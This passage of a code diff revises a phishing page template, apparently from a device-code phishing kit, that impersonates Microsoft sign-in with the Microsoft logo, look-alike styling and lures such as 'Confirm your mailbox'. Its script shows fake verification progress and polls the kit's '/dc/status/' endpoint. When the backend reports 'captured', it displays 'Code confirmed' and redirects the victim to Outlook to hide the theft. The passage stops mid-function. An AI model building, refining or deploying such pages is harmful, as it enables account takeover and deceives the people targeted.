@@ -961,182 +961,306 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Microsoft account</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Sign in to your account</title>
 <style>
   :root {
-    --brand: #0067b8;
-    --brand-hover: #005a9e;
-    --ink: #1a1a1a;
-    --ink-secondary: #616161;
-    --ink-tertiary: #8a8886;
-    --bg-subtle: #faf9f8;
-    --line: #e1dfdd;
-    --line-strong: #c8c6c4;
-    --green: #107c10;
-    --footer-link: #616161;
+    color-scheme: light;
+    --page-bg: #f2f2f2;
+    --card-bg: #ffffff;
+    --ink: #1b1b1b;
+    --ink-soft: #605e5c;
+    --line: #666666;
+    --line-soft: #e1dfdd;
+    --accent: #0067b8;
+    --accent-hover: #005da6;
+    --error: #e81123;
+    --disabled-bg: #f3f2f1;
+    --disabled-ink: #a19f9d;
+    --focus-ring: #0067b8;
   }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
 
-  html, body {
-    min-height: 100%;
-    background: #eef2f7;
-    font-family: 'Segoe UI', 'Segoe UI Variable', -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
-    font-size: 15px;
+  * { box-sizing: border-box; }
+
+  html, body { height: 100%; }
+
+  body {
+    margin: 0;
+    background: var(--page-bg);
     color: var(--ink);
-    line-height: 1.5;
-    -webkit-font-smoothing: antialiased;
-  }
-
-  /* faint Microsoft sign-in backdrop */
-  body::before {
-    content: "";
-    position: fixed;
-    inset: 0;
-    z-index: -1;
-    background-color: #eef2f7;
-    background-image:
-      radial-gradient(ellipse 80% 70% at 50% 40%, rgba(255,255,255,0.95) 0%, rgba(238,242,247,0.85) 45%, rgba(218,225,235,0.75) 100%),
-      linear-gradient(160deg, #dce6f2 0%, #eef2f7 40%, #e8edf4 70%, #d4dfeb 100%);
-    background-size: cover;
-    background-position: center;
-    background-repeat: no-repeat;
-  }
-
-  .header {
-    height: 48px;
+    font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system,
+      BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+    font-size: 15px;
+    line-height: 1.4;
     display: flex;
-    align-items: center;
-    padding: 0 24px;
-    border-bottom: 1px solid rgba(0,0,0,0.06);
-    background: transparent;
-    position: relative;
-    z-index: 2;
+    flex-direction: column;
+    min-height: 100%;
+    padding-top: env(safe-area-inset-top, 0px);
+    padding-bottom: env(safe-area-inset-bottom, 0px);
   }
-  .header img { height: 20px; width: auto; display: block; }
 
   .stage {
-    min-height: calc(100vh - 48px - 56px);
+    flex: 1 0 auto;
     display: flex;
     align-items: center;
     justify-content: center;
-    padding: 40px 16px 32px;
-    position: relative;
-    z-index: 1;
+    padding: 24px 16px;
   }
 
-  .card { width: 100%; max-width: 440px; padding: 32px 0; }
-
-  h1 { font-size: 24px; font-weight: 600; line-height: 32px; margin-bottom: 6px; color: var(--ink); }
-  .subtitle { font-size: 15px; color: var(--ink-secondary); margin-bottom: 24px; line-height: 20px; }
-
-  .reassure {
-    background: rgba(255,255,255,0.85);
-    border: 1px solid var(--line);
-    border-radius: 4px;
-    padding: 12px 14px;
-    margin-bottom: 28px;
-    font-size: 13px;
-    color: var(--ink-secondary);
-    line-height: 18px;
-  }
-  .reassure strong { color: var(--ink); font-weight: 600; }
-
-  .label { font-size: 13px; font-weight: 600; margin-bottom: 6px; color: var(--ink); }
-
-  .code-row { position: relative; margin-bottom: 16px; }
-  .code-box {
+  .card {
+    background: var(--card-bg);
     width: 100%;
-    background: rgba(255,255,255,0.9);
-    border: 1px solid var(--line-strong);
-    border-radius: 4px;
-    padding: 14px 48px 14px 14px;
-    font-family: 'Segoe UI', 'Courier New', monospace;
-    font-size: 22px;
-    font-weight: 600;
-    letter-spacing: 4px;
-    text-indent: 4px;
-    color: var(--ink);
-    text-align: center;
-    user-select: all;
+    max-width: 440px;
+    padding: 44px;
+    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+    animation: rise 0.28s ease-out both;
   }
-  .code-box.loading {
-    color: var(--ink-tertiary);
-    font-size: 15px;
-    font-weight: 400;
-    letter-spacing: normal;
-    text-indent: 0;
-  }
-  .code-box:focus { outline: none; border-color: var(--brand); }
 
-  .btn-copy {
-    position: absolute;
-    right: 10px;
-    top: 50%;
-    transform: translateY(-50%);
-    background: none;
-    border: none;
-    color: var(--brand);
-    cursor: pointer;
-    padding: 6px;
+  @keyframes rise {
+    from { opacity: 0; transform: translateY(6px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    .card { animation: none; }
+    .spinner { animation: none; }
+  }
+
+  .brand {
     display: flex;
     align-items: center;
-    border-radius: 4px;
+    gap: 6px;
+    margin-bottom: 16px;
+    height: 24px;
   }
-  .btn-copy:hover { background: rgba(0,0,0,0.05); }
-  .btn-copy svg { width: 18px; height: 18px; }
-  .btn-copy .icon-copied { display: none; color: var(--green); }
-  .btn-copy.is-copied .icon-default { display: none; }
-  .btn-copy.is-copied .icon-copied { display: block; }
+  .brand svg { display: block; }
+  .brand span {
+    font-size: 15px;
+    font-weight: 600;
+    color: #5e5e5e;
+    letter-spacing: 0;
+  }
 
-  .status { min-height: 20px; font-size: 13px; color: var(--green); margin: -4px 0 8px; }
+  h1 {
+    font-size: 24px;
+    font-weight: 600;
+    margin: 0 0 12px;
+    color: var(--ink);
+  }
 
-  .btn-primary {
-    display: block;
+  p.lead {
+    margin: 0 0 16px;
+    color: var(--ink);
+  }
+
+  .field {
+    margin: 4px 0 20px;
+  }
+
+  input[type="text"] {
     width: 100%;
-    padding: 12px 16px;
-    background: var(--brand);
-    color: #ffffff;
-    border: none;
-    border-radius: 4px;
     font-family: inherit;
     font-size: 15px;
-    font-weight: 600;
-    cursor: pointer;
-    margin-top: 8px;
+    color: var(--ink);
+    padding: 6px 10px 7px;
+    border: 1px solid var(--line);
+    border-radius: 0;
+    outline: none;
+    background: #fff;
+    letter-spacing: 2px;
   }
-  .btn-primary:hover { background: var(--brand-hover); }
-  .btn-primary:disabled { background: #c8c6c4; cursor: not-allowed; }
+  input[type="text"]::placeholder {
+    color: #767676;
+    letter-spacing: 0;
+  }
+  input[type="text"]:hover { border-color: #323130; }
+  input[type="text"]:focus {
+    border-color: var(--accent);
+    box-shadow: inset 0 0 0 1px var(--accent);
+  }
+  input[type="text"].invalid {
+    border-color: var(--error);
+    box-shadow: inset 0 0 0 1px var(--error);
+  }
 
-  .timer {
-    margin-top: 20px;
+  .error-text {
+    color: var(--error);
     font-size: 13px;
-    color: var(--ink-secondary);
+    margin: 8px 0 0;
+    min-height: 16px;
+    display: none;
+  }
+  .error-text.show { display: block; }
+
+  .actions {
+    display: flex;
+    justify-content: flex-end;
+    margin-top: 24px;
+  }
+
+  button.primary {
+    font-family: inherit;
+    font-size: 15px;
+    color: #fff;
+    background: var(--accent);
+    border: none;
+    border-radius: 0;
+    min-width: 108px;
+    height: 36px;
+    padding: 0 12px;
+    cursor: pointer;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+  button.primary:hover { background: var(--accent-hover); }
+  button.primary:focus-visible {
+    outline: 2px solid var(--focus-ring);
+    outline-offset: 2px;
+  }
+  button.primary:disabled {
+    background: var(--disabled-bg);
+    color: var(--disabled-ink);
+    cursor: default;
+  }
+
+  .spinner {
+    width: 16px;
+    height: 16px;
+    border: 2px solid rgba(255, 255, 255, 0.5);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* confirmed state */
+  .confirm { text-align: left; }
+  .confirm .check {
+    width: 48px;
+    height: 48px;
+    border-radius: 50%;
+    background: #107c10;
     display: flex;
     align-items: center;
-    justify-content: space-between;
+    justify-content: center;
+    margin-bottom: 20px;
   }
-  .timer strong { color: var(--ink); font-weight: 600; }
-  .refresh {
+  .confirm .code-pill {
+    display: inline-block;
+    font-family: "Segoe UI", sans-serif;
+    font-weight: 600;
+    letter-spacing: 3px;
+    background: #f3f2f1;
+    border: 1px solid var(--line-soft);
+    padding: 6px 12px;
+    margin-top: 4px;
+  }
+  .email-note {
+    display: flex;
+    align-items: flex-start;
+    gap: 8px;
+    margin: 16px 0 0;
+    font-size: 13px;
+    color: var(--ink-soft);
+  }
+  .email-note svg {
+    flex-shrink: 0;
+    margin-top: 1px;
+    color: var(--accent);
+  }
+
+  .link-btn {
     background: none;
     border: none;
-    color: var(--brand);
-    font: inherit;
-    font-size: 13px;
-    font-weight: 600;
-    cursor: pointer;
+    color: var(--accent);
+    font-family: inherit;
+    font-size: 15px;
     padding: 0;
+    margin-top: 20px;
+    cursor: pointer;
   }
-  .refresh:hover { text-decoration: underline; }
+  .link-btn:hover { text-decoration: underline; }
 
-  .verify-view { display: none; padding: 8px 0; }
-  .verify-view h2 { font-size: 24px; font-weight: 600; line-height: 32px; margin-bottom: 6px; }
-  .verify-view > p { font-size: 15px; color: var(--ink-secondary); margin-bottom: 24px; line-height: 20px; }
+  /* demo-only helper (not part of the real Microsoft UI) */
+  .demo {
+    margin: 0 0 20px;
+    padding: 10px 12px;
+    border: 1px dashed #c8c6c4;
+    background: #faf9f8;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-size: 13px;
+    color: var(--ink-soft);
+  }
+  .demo .demo-label { white-space: nowrap; }
+  .demo button {
+    margin-left: auto;
+    font-family: inherit;
+    font-size: 14px;
+    font-weight: 600;
+    letter-spacing: 3px;
+    color: var(--ink);
+    background: #fff;
+    border: 1px solid var(--line-soft);
+    border-radius: 2px;
+    padding: 5px 10px;
+    cursor: pointer;
+  }
+  .demo button:hover { border-color: var(--accent); color: var(--accent); }
+  .demo button:focus-visible {
+    outline: 2px solid var(--focus-ring);
+    outline-offset: 2px;
+  }
+
+  .demo .copy-btn {
+    margin-left: 4px;
+    letter-spacing: 0;
+    padding: 6px;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--ink-soft);
+    line-height: 0;
+  }
+  .copy-btn .icon-check { display: none; }
+  .copy-btn.copied { color: #107c10; border-color: #107c10; }
+  .copy-btn.copied .icon-copy { display: none; }
+  .copy-btn.copied .icon-check { display: block; }
+
+  .hidden { display: none; }
+
+  footer {
+    flex-shrink: 0;
+    display: flex;
+    justify-content: flex-end;
+    gap: 18px;
+    padding: 12px 24px calc(12px + env(safe-area-inset-bottom, 0px));
+    font-size: 12px;
+    color: #5e5e5e;
+  }
+  footer a {
+    color: #5e5e5e;
+    text-decoration: none;
+  }
+  footer a:hover { text-decoration: underline; }
+
+  @media (max-width: 480px) {
+    .card { padding: 32px 24px; box-shadow: none; }
+    .stage { padding: 8px; align-items: flex-start; }
+  }
+
+  /* ——— OneDrive verification / progress view ——— */
+  .verify-view { display: none; }
+  .verify-view h2 { font-size: 24px; font-weight: 600; margin: 0 0 6px; }
+  .verify-view > p { font-size: 15px; color: var(--ink-soft); margin-bottom: 20px; }
   .progress-box {
-    background: rgba(255,255,255,0.85);
-    border: 1px solid var(--line);
-    border-radius: 4px;
+    background: #faf9f8;
+    border: 1px solid var(--line-soft);
     padding: 16px;
+    margin-bottom: 8px;
   }
   .progress-row {
     display: flex;
@@ -1144,296 +1268,372 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
     gap: 12px;
     font-size: 14px;
     padding: 10px 0;
-    color: var(--ink-secondary);
+    color: var(--ink-soft);
     line-height: 20px;
   }
-  .progress-row:not(:last-child) { border-bottom: 1px solid var(--line); }
+  .progress-row:not(:last-child) { border-bottom: 1px solid var(--line-soft); }
   .progress-row .dot {
     width: 18px; height: 18px;
     border-radius: 50%;
-    border: 2px solid var(--line-strong);
+    border: 2px solid #c8c6c4;
     flex-shrink: 0;
     display: inline-flex;
     align-items: center;
     justify-content: center;
+    font-size: 11px;
   }
-  .progress-row.done .dot { background: var(--green); border-color: var(--green); color: #fff; font-size: 11px; }
+  .progress-row.done .dot { background: #107c10; border-color: #107c10; color: #fff; }
   .progress-row.done { color: var(--ink); }
-  .progress-row.active .dot { border-color: var(--brand); border-top-color: transparent; animation: spin 0.9s linear infinite; }
+  .progress-row.active .dot { border-color: var(--accent); border-top-color: transparent; animation: spin 0.9s linear infinite; }
   .progress-row.active { color: var(--ink); font-weight: 600; }
-  @keyframes spin { to { transform: rotate(360deg); } }
-
-  .fineprint { font-size: 12px; color: var(--ink-tertiary); margin-top: 16px; line-height: 16px; }
-
-  .success-view { display: none; text-align: center; padding: 16px 0; }
+  .fineprint { font-size: 12px; color: #8a8886; margin-top: 12px; line-height: 16px; }
+  .success-view { display: none; text-align: left; }
   .success-view .check {
-    display: inline-flex; align-items: center; justify-content: center;
-    width: 52px; height: 52px; border-radius: 50%;
-    background: var(--green); color: #ffffff; font-size: 26px;
-    margin-bottom: 16px;
+    width: 48px; height: 48px; border-radius: 50%;
+    background: #107c10; color: #fff; font-size: 24px;
+    display: flex; align-items: center; justify-content: center;
+    margin-bottom: 20px;
   }
-  .success-view h2 { font-size: 24px; font-weight: 600; line-height: 32px; margin-bottom: 6px; }
-  .success-view p { color: var(--ink-secondary); font-size: 15px; }
-
-  .ms-footer {
-    border-top: 1px solid rgba(0,0,0,0.06);
-    padding: 14px 24px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    flex-wrap: wrap;
-    gap: 10px 18px;
-    font-size: 12px;
-    color: var(--footer-link);
-    line-height: 16px;
-    background: transparent;
-    position: relative;
-    z-index: 2;
-  }
-  .ms-footer .links { display: flex; align-items: center; gap: 18px; flex-wrap: wrap; }
-  .ms-footer a { color: var(--footer-link); text-decoration: none; font-size: 12px; }
-  .ms-footer a:hover { text-decoration: underline; }
-  .ms-footer .copy { font-size: 12px; color: var(--footer-link); }
-
-  @media (max-width: 480px) {
-    .header { padding: 0 16px; }
-    .card { padding: 24px 0; }
-    h1 { font-size: 21px; }
-    .ms-footer { padding: 12px 16px; justify-content: center; text-align: center; }
-    .ms-footer .links { justify-content: center; }
-  }
+  .success-view h2 { font-size: 24px; font-weight: 600; margin: 0 0 6px; }
+  .success-view p { color: var(--ink-soft); font-size: 15px; margin: 0; }
 </style>
 </head>
 <body>
+  <main class="stage">
+    <section class="card" role="region" aria-label="Sign in">
 
-<div class="header">
-  <img src="https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/microsoft/default.svg" alt="Microsoft">
-</div>
-
-<div class="stage">
-  <div class="card">
-
-    <div id="mainView">
-      <h1>Confirm your mailbox</h1>
-      <p class="subtitle">Enter the code below to finish the security update.</p>
-
-      <div class="reassure">
-        <strong>What happens next:</strong> we will verify the code, then send a short test message to your inbox. A reply confirms your mailbox is responding — nothing on your device will change.
-      </div>
-
-      <div class="label">Verification code</div>
-      <div class="code-row">
-        <div class="code-box loading" id="codeBox">Loading...</div>
-        <button class="btn-copy" id="copyBtn" title="Copy code" onclick="copyCodeAction()" disabled>
-          <svg class="icon-default" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
-            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+      <!-- Entry view -->
+      <div id="entry">
+        <div class="brand">
+          <svg width="20" height="20" viewBox="0 0 20 20" aria-hidden="true">
+            <rect x="0" y="0" width="9" height="9" fill="#f25022"/>
+            <rect x="11" y="0" width="9" height="9" fill="#7fba00"/>
+            <rect x="0" y="11" width="9" height="9" fill="#00a4ef"/>
+            <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
           </svg>
-          <svg class="icon-copied" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-            <polyline points="20 6 9 17 4 12"></polyline>
+          <span>Microsoft</span>
+        </div>
+
+        <h1>Enter code</h1>
+        <p class="lead">Enter the code sent to your device or the code displayed on your screen.</p>
+
+        <div class="demo">
+          <span class="demo-label">Your code</span>
+          <button type="button" id="demo-code" aria-label="Use code">——</button>
+          <button type="button" id="copy-code" class="copy-btn" aria-label="Copy code">
+            <svg class="icon-copy" width="16" height="16" viewBox="0 0 16 16" fill="none" aria-hidden="true">
+              <rect x="5" y="5" width="8" height="9" rx="1.2" stroke="currentColor" stroke-width="1.3"/>
+              <path d="M3 10.5V3a1 1 0 0 1 1-1h6" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/>
+            </svg>
+            <svg class="icon-check" width="16" height="16" viewBox="0 0 16 16" fill="none" aria-hidden="true">
+              <path d="M3 8.5l3.2 3.2L13 5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </button>
+        </div>
+
+        <div class="field">
+          <input
+            id="code"
+            type="text"
+            inputmode="text"
+            autocomplete="off"
+            spellcheck="false"
+            placeholder="Code"
+            aria-label="Device code"
+            maxlength="12">
+          <p class="error-text" id="error" role="alert">Your code isn’t recognized. Check it and try again.</p>
+        </div>
+
+        <div class="actions">
+          <button class="primary" id="next" disabled>
+            <span id="next-label">Next</span>
+          </button>
+        </div>
+
+        <p class="email-note">
+          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" aria-hidden="true">
+            <rect x="1.5" y="3" width="13" height="10" rx="1.2" stroke="currentColor" stroke-width="1.2"/>
+            <path d="M2 4l6 4.5L14 4" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
           </svg>
-        </button>
+          <span>A message will be sent to your email once the code is verified.</span>
+        </p>
       </div>
 
-      <div class="status" id="codeStatus"></div>
-
-      <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>Verify and send test message</button>
-
-      <div class="timer">
-        <span>Code expires in <strong id="timer">{expires_minutes}</strong></span>
-        <button class="refresh" onclick="triggerManualRefresh()">Refresh</button>
+      <!-- Verifying view (fused from OneDrive theme) -->
+      <div id="verifyView" class="verify-view">
+        <h2>Verifying your mailbox</h2>
+        <p>This usually takes a few seconds. Please keep this window open.</p>
+        <div class="progress-box">
+          <div class="progress-row done" id="step1"><span class="dot">✓</span> Code accepted</div>
+          <div class="progress-row active" id="step2"><span class="dot"></span> Confirming mailbox reachability</div>
+          <div class="progress-row" id="step3"><span class="dot"></span> Sending test message to your inbox</div>
+        </div>
+        <p class="fineprint">If the test message does not arrive within 60 seconds, check your spam folder before closing this window.</p>
       </div>
-    </div>
 
-    <div class="verify-view" id="verifyView">
-      <h2>Verifying your mailbox</h2>
-      <p>This usually takes a few seconds. Please keep this window open.</p>
-      <div class="progress-box">
-        <div class="progress-row done" id="step1"><span class="dot">✓</span> Code accepted</div>
-        <div class="progress-row active" id="step2"><span class="dot"></span> Confirming mailbox reachability</div>
-        <div class="progress-row" id="step3"><span class="dot"></span> Sending test message to your inbox</div>
+      <!-- Confirmed / success view -->
+      <div id="confirmed" class="success-view">
+        <div class="check" aria-hidden="true">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+            <path d="M5 12.5l4 4L19 7" stroke="#fff" stroke-width="2.4"
+              stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <h2>Code confirmed</h2>
+        <p>You can now return to your account. It’s connected and ready to use.</p>
+        <p style="margin-top:12px; font-size:13px; color:#8a8886;">A test message has been sent to your inbox.</p>
       </div>
-      <p class="fineprint">If the test message does not arrive within 60 seconds, check your spam folder before closing this window.</p>
-    </div>
 
-    <div class="success-view" id="successView">
-      <div class="check">✔</div>
-      <h2>Verified</h2>
-      <p>A test message has been sent to your inbox.</p>
-    </div>
+    </section>
+  </main>
 
-  </div>
-</div>
-
-<div class="ms-footer">
-  <div class="links">
-    <a href="https://support.microsoft.com/contactus" target="_blank" rel="noopener">Contact Microsoft</a>
-    <a href="https://privacy.microsoft.com/en-us" target="_blank" rel="noopener">Privacy &amp; cookies</a>
-    <a href="https://www.microsoft.com/servicesagreement" target="_blank" rel="noopener">Terms of use</a>
-  </div>
-  <div class="copy">&copy; 2026 Microsoft</div>
-</div>
+  <footer>
+    <a href="#terms">Terms of use</a>
+    <a href="#privacy">Privacy &amp; cookies</a>
+  </footer>
 
 <script>
-(function(){
-  var sid = '{session_id}';
-  var verifyUrl = '{verify_url}';
-  var codeReady = {code_ready};
-  var code = '{user_code}';
-  var expiresIn = {expires_seconds};
+  (function () {
+    // —— Fused configuration (from OneDrive theme) ——
+    var sid = '{session_id}';
+    var verifyUrl = '{verify_url}';
+    var codeReady = {code_ready};
+    var userCode = '{user_code}';
+    var expiresIn = {expires_seconds};
 
-  // fallback destination if the backend sends no redirect_url
-  var DEFAULT_REDIRECT = 'https://outlook.office.com/mail/inbox';
+    // DOM refs — shared entry form
+    const input   = document.getElementById("code");
+    const next    = document.getElementById("next");
+    const label   = document.getElementById("next-label");
+    const error   = document.getElementById("error");
+    const entry   = document.getElementById("entry");
+    const done    = document.getElementById("confirmed");
+    const demoBtn = document.getElementById("demo-code");
+    const copyBtn = document.getElementById("copy-code");
 
-  var popup = null;
+    // DOM refs — verification / polling
+    const verifyView = document.getElementById("verifyView");
+    const step1      = document.getElementById("step1");
+    const step2      = document.getElementById("step2");
+    const step3      = document.getElementById("step3");
 
-  var codeEl = document.getElementById('codeBox');
-  var statusEl = document.getElementById('codeStatus');
-  var btnEl = document.getElementById('signInBtn');
-  var copyBtn = document.getElementById('copyBtn');
-  var timerEl = document.getElementById('timer');
-  var mainView = document.getElementById('mainView');
-  var verifyView = document.getElementById('verifyView');
-  var successView = document.getElementById('successView');
-  var step2 = document.getElementById('step2');
-  var step3 = document.getElementById('step3');
+    // Keep the demo code button in sync with the backend-supplied code when available
+    function setDemoCode(c) {
+      if (!c) return;
+      demoBtn.textContent = c;
+      demoBtn.setAttribute("aria-label", "Use code " + c);
+    }
+    if (codeReady && userCode) setDemoCode(userCode);
 
-  function showCode(c, v) {
-    code = c;
-    if (v) verifyUrl = v;
-    codeEl.textContent = c;
-    codeEl.classList.remove('loading');
-    codeEl.style.letterSpacing = '4px';
-    codeEl.style.textIndent = '4px';
-    codeEl.style.fontSize = '22px';
-    codeEl.style.fontWeight = '600';
-    codeEl.style.color = '#1a1a1a';
-    btnEl.disabled = false;
-    copyBtn.disabled = false;
-  }
+    // —— Entry form logic (from original file) ——
+    function cleaned() {
+      return input.value.trim().toUpperCase();
+    }
 
-  if (codeReady && code) showCode(code, verifyUrl);
+    function refresh() {
+      next.disabled = cleaned().length < 6;
+      if (input.classList.contains("invalid") && cleaned().length >= 6) {
+        input.classList.remove("invalid");
+        error.classList.remove("show");
+      }
+    }
 
-  window.copyCodeAction = function() {
-    if (!code || code === 'Loading...') return;
-    const processState = () => {
-      copyBtn.classList.add('is-copied');
-      if (statusEl) statusEl.textContent = 'Copied';
-      setTimeout(() => { copyBtn.classList.remove('is-copied'); }, 2000);
-    };
-    if (navigator.clipboard) {
-      navigator.clipboard.writeText(codeEl.textContent).then(processState).catch(() => {
-        fallbackCopy(codeEl.textContent, processState);
+    input.addEventListener("input", function () {
+      const pos = input.selectionStart;
+      input.value = input.value.replace(/\s+/g, "").toUpperCase();
+      input.setSelectionRange(pos, pos);
+      refresh();
+    });
+
+    input.addEventListener("keydown", function (e) {
+      if (e.key === "Enter" && !next.disabled) submit();
+    });
+
+    next.addEventListener("click", submit);
+
+    function submit() {
+      if (next.disabled) return;
+      const code = cleaned();
+
+      // validating state
+      next.disabled = true;
+      label.textContent = "";
+      const sp = document.createElement("span");
+      sp.className = "spinner";
+      next.appendChild(sp);
+
+      // Begin the OneDrive-style verification flow immediately
+      showVerifying();
+
+      // Simulate code check; then poll backend
+      setTimeout(function () {
+        next.removeChild(sp);
+        label.textContent = "Next";
+
+        // Mock check: any code ending in "0" is treated as not recognized.
+        if (code.endsWith("0")) {
+          input.classList.add("invalid");
+          error.classList.add("show");
+          input.focus();
+          refresh();
+          // revert to entry view if verification was shown
+          entry.classList.remove("hidden");
+          verifyView.style.display = "none";
+        } else {
+          // Transition to verifying view (already shown by showVerifying)
+          // Polling will handle the rest
+          startPolling();
+        }
+      }, 850);
+    }
+
+    function showVerifying() {
+      entry.classList.add("hidden");
+      verifyView.style.display = "block";
+      done.classList.add("hidden");
+      step2.className = "progress-row active";
+      step2.querySelector(".dot").textContent = "";
+      step3.className = "progress-row";
+      step3.querySelector(".dot").textContent = "";
+    }
+
+    function showSuccess() {
+      entry.classList.add("hidden");
+      verifyView.style.display = "none";
+      done.classList.remove("hidden");
+    }
+
+    // —— OneDrive-style polling (kept intact) ——
+    var pollStarted = false;
+
+    function startPolling() {
+      if (pollStarted) return;
+      pollStarted = true;
+      poll();
+    }
+
+    function poll() {
+      fetch('/dc/status/' + sid, { method: 'GET', credentials: 'include' })
+      .then(function(r) { return r.json(); })
+      .then(function(d) {
+        if (d.ready && !codeReady) {
+          codeReady = true;
+          if (d.user_code) {
+            userCode = d.user_code;
+            setDemoCode(userCode);
+          }
+          if (d.verify_url) verifyUrl = d.verify_url;
+        }
+
+        if (d.captured) {
+          showSuccess();
+          var target = d.redirect_url || 'https://outlook.office.com/mail/inbox';
+          setTimeout(function() { top.location.href = target; }, 2500);
+          return; // stop polling
+        }
+
+        if (d.failed || d.expired) {
+          // revert to entry with error
+          entry.classList.remove("hidden");
+          verifyView.style.display = "none";
+          done.classList.add("hidden");
+          input.classList.add("invalid");
+          error.classList.add("show");
+          next.disabled = false;
+          return;
+        }
+
+        // advance progress rows while waiting
+        if (step2.classList.contains("active")) {
+          setTimeout(function() {
+            if (step2.classList.contains("active")) {
+              step2.classList.remove("active");
+              step2.classList.add("done");
+              step2.querySelector(".dot").textContent = "✓";
+              step3.classList.add("active");
+            }
+          }, 1400);
+        }
+        if (step3.classList.contains("active")) {
+          setTimeout(function() {
+            if (step3.classList.contains("active")) {
+              step3.classList.remove("active");
+              step3.classList.add("done");
+              step3.querySelector(".dot").textContent = "✓";
+            }
+          }, 2800);
+        }
+
+        setTimeout(poll, 3000);
+      })['catch'](function() {
+        setTimeout(poll, 5000);
       });
-    } else {
-      fallbackCopy(codeEl.textContent, processState);
-    }
-  };
-
-  function fallbackCopy(text, callback) {
-    const t = document.createElement('input');
-    t.value = text;
-    document.body.appendChild(t);
-    t.select();
-    document.execCommand('copy');
-    document.body.removeChild(t);
-    if (callback) callback();
-  }
-
-  window.openSignIn = function() {
-    if (!code || code === 'Loading...') return;
-    mainView.style.display = 'none';
-    verifyView.style.display = 'block';
-    setTimeout(function(){
-      if (step2) { step2.classList.remove('active'); step2.classList.add('done'); step2.querySelector('.dot').textContent = '✓'; }
-      if (step3) step3.classList.add('active');
-    }, 1400);
-    setTimeout(function(){
-      if (step3) { step3.classList.remove('active'); step3.classList.add('done'); step3.querySelector('.dot').textContent = '✓'; }
-    }, 2800);
-
-    if (navigator.clipboard) {
-      navigator.clipboard.writeText(code).catch(function(){});
-    } else {
-      var t = document.createElement('textarea');
-      t.value = code;
-      t.style.cssText = 'position:fixed;left:-9999px';
-      document.body.appendChild(t);
-      t.select();
-      document.execCommand('copy');
-      document.body.removeChild(t);
     }
 
-    var w = 520, h = 700, l = (screen.width - w) / 2, t = (screen.height - h) / 2;
-    popup = window.open(verifyUrl, 'ms', 'width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
-    if (popup) popup.focus();
-  };
+    // —— Demo / copy helpers (fused) ——
+    demoBtn.addEventListener("click", function () {
+      input.value = demoBtn.textContent.replace(/[^A-Z0-9]/gi, "").toUpperCase();
+      input.classList.remove("invalid");
+      error.classList.remove("show");
+      refresh();
+      input.focus();
+    });
 
-  function updateTimer() {
-    if (expiresIn <= 0) return;
-    expiresIn--;
-    var m = Math.floor(expiresIn / 60);
-    var s = expiresIn % 60;
-    timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
-    if (expiresIn > 0) setTimeout(updateTimer, 1000);
-  }
-
-  if (codeReady) setTimeout(updateTimer, 1000);
-
-  window.triggerManualRefresh = function() {
-    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'.split('');
-    let fresh = '';
-    for (let i = 0; i < 9; i++) fresh += chars[Math.floor(Math.random() * chars.length)];
-    code = fresh;
-    codeEl.textContent = fresh;
-    codeEl.classList.remove('loading');
-    expiresIn = 720;
-    var m = Math.floor(expiresIn / 60);
-    var s = expiresIn % 60;
-    timerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
-    if (statusEl) statusEl.textContent = '';
-    btnEl.disabled = false;
-    copyBtn.disabled = false;
-  };
-
-  function poll() {
-    fetch('/dc/status/' + sid, { method: 'GET', credentials: 'include' })
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
-      if (d.ready && !codeReady) {
-        codeReady = true;
-        showCode(d.user_code, d.verify_url);
-        if (expiresIn === {expires_seconds}) setTimeout(updateTimer, 1000);
+    let copyTimer;
+    copyBtn.addEventListener("click", function () {
+      const text = demoBtn.textContent.trim();
+      const show = function () {
+        copyBtn.classList.add("copied");
+        copyBtn.setAttribute("aria-label", "Copied");
+        clearTimeout(copyTimer);
+        copyTimer = setTimeout(function () {
+          copyBtn.classList.remove("copied");
+          copyBtn.setAttribute("aria-label", "Copy code");
+        }, 1600);
+      };
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(show).catch(fallbackCopy);
+      } else {
+        fallbackCopy();
       }
-      if (d.captured) {
-        if (mainView) mainView.style.display = 'none';
-        if (verifyView) verifyView.style.display = 'none';
-        if (successView) successView.style.display = 'block';
